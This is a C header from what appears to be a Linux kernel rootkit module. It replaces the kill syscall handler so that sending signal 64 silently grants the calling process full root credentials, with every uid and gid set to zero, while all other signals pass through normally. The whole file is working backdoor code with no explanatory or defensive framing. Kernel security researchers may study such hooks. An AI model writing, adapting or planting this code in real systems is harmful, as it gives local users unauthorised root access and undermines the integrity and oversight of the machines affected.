#ifndef _HOOK_KILL_H_
#define _HOOK_KILL_H_

static asmlinkage long (*orig_kill)(const struct pt_regs *);

notrace asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "lkm: Giving Root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);

}


// this section below is the set_root function

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

#endif
